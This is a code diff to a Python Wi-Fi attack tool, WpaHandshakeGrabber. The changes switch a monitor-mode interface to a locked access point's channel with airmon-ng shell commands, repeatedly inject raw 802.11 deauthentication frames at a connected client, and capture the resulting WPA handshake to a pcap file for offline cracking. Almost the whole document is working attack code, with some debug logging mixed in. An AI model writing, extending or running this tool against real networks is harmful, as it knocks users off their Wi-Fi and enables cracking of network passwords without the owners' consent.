@@ -1,6 +1,7 @@
 import os
 import time
 import socket
+import subprocess
 from lib.Pcap import Pcap
 from lib.Logger import Logger
 from lib.Target import Target
@@ -75,8 +76,20 @@ class WpaHandshakeGrabber():
                     target = Target(frame.destination)
                     ap_manager.addTarget(target, frame.source)
 
-                if ap_manager.update() and frame.source not in mac_collected:
+                if ap_manager.update() and frame.source not in mac_collected and ap_manager.locked_ap is not 0:
                     current_state = 'ap_locked'
+
+                    # Move me
+                    root_dev_name = form.interface.split('mon')[0]
+                    Logger.log('Root dev name = {}'.format(root_dev_name))
+                    Logger.log('Switching monitor to channel {}'.format(ap_manager.locked_ap.channel))
+                    process = subprocess.Popen("airmon-ng stop {};airmon-ng start {} {}".format(form.interface, root_dev_name, ap_manager.locked_ap.channel), shell=True, stdout=subprocess.PIPE)
+                    process.wait()
+
+                    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
+                    s.bind((form.interface, 0x0003))
+
+                    last_deauth = None
                     pcap_file = WpaHandshakeGrabber.startPcap(ap_manager.locked_ap)
                     WpaHandshakeGrabber.switchToLockedTargetView(form, ap_manager.locked_ap.ssid)
             elif current_state == 'ap_locked':
@@ -84,20 +97,34 @@ class WpaHandshakeGrabber():
                     target = Target(frame.destination)
                     ap_manager.addTarget(target, frame.source)
 
-                if ap_manager.locked_ap is not None and frame.isQOSFrame() and len(packet) == 163 and frame.source == ap_manager.locked_ap.mac:
+                if (frame.isQOSFrame()):
+                    Logger.log('dest {} == {}'.format(frame.destination, ap_manager.locked_ap.mac))
+                    Logger.log('srce {} == {}'.format(frame.source, ap_manager.locked_ap.mac))
+                    Logger.log('packet len = {}'.format(len(packet)))
+                    Logger.log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
+                if frame.isQOSFrame() and len(packet) == 163 and frame.source == ap_manager.locked_ap.mac:
                     Logger.log('Handshake Found on {}'.format(ap_manager.locked_ap.ssid))
                     current_state = 'scanning'
                     mac_collected.append(ap_manager.locked_ap.mac)
                     ap_manager.locked_ap = None
+                    last_deauth = None
+
+                    root_dev_name = form.interface.split('mon')[0]
+                    process = subprocess.Popen("airmon-ng stop {};airmon-ng start {}".format(form.interface, root_dev_name), shell=True, stdout=subprocess.PIPE)
+                    process.wait()
+                    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
+                    s.bind((form.interface, 0x0003))
                     continue
                 
                 WpaHandshakeGrabber.writePcap(pcap_file, packet)
-                if last_deauth is None or time.time() - last_deauth > 20:
+                if last_deauth is None or time.time() - last_deauth > 90:
+                    Logger.log("!!!IN deauth")
                     last_deauth = time.time()
-
-                    for target in ap_manager.locked_ap.targets:
-                        deauth_frame = Deauth.getDeauthFrame(ap_manager.locked_ap, target)
-                        WpaHandshakeGrabber.writePcap(pcap_file, deauth_frame)
+                    target = ap_manager.locked_ap.targets.pop()
+                    deauth_frame = Deauth.getDeauthFrame(ap_manager.locked_ap, target)
+                    WpaHandshakeGrabber.writePcap(pcap_file, deauth_frame)
+                    for x in range(0, 10):
                         s.send(deauth_frame)
+                            
             
             WpaHandshakeGrabber.updateUI(form, current_state, ap_manager)
